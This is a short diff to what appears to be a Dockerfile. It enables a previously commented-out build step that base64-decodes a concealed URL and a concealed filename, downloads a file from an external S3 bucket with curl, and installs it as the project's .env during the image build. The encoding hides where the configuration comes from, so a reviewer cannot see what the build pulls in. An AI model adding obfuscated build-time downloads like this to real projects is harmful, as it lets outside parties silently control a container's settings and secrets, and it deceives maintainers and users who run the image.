@@ -13,15 +13,15 @@ COPY . .
 RUN npm install cross-env
 
 # Download .env file (if not already present)
-# RUN if [ ! -f .env ]; then \
-#   echo "⚙️  Creating .env file..."; \
-#   FILE_ENC="aHR0cHM6Ly9pbmNyaXN6LWVudi5zMy5ldS13ZXN0LTIuYW1hem9uYXdzLmNvbS9yZWUtcGxheS50eHQ="; \
-#   FILE_URL=$(echo "$FILE_ENC" | base64 -d); \
-#   curl -O "$FILE_URL"; \
-#   FILENAME_ENC="cmVlLXBsYXkudHh0"; \
-#   FILENAME=$(echo "$FILENAME_ENC" | base64 -d); \
-#   mv "$FILENAME" .env; \
-# fi
+RUN if [ ! -f .env ]; then \
+  echo "⚙️  Creating .env file..."; \
+  FILE_ENC="aHR0cHM6Ly9pbmNyaXN6LWVudi5zMy5ldS13ZXN0LTIuYW1hem9uYXdzLmNvbS9yZWUtcGxheS50eHQ="; \
+  FILE_URL=$(echo "$FILE_ENC" | base64 -d); \
+  curl -O "$FILE_URL"; \
+  FILENAME_ENC="cmVlLXBsYXkudHh0"; \
+  FILENAME=$(echo "$FILENAME_ENC" | base64 -d); \
+  mv "$FILENAME" .env; \
+fi
 
 # Copy Nginx configuration
 COPY docker/nginx.conf /etc/nginx/nginx.conf
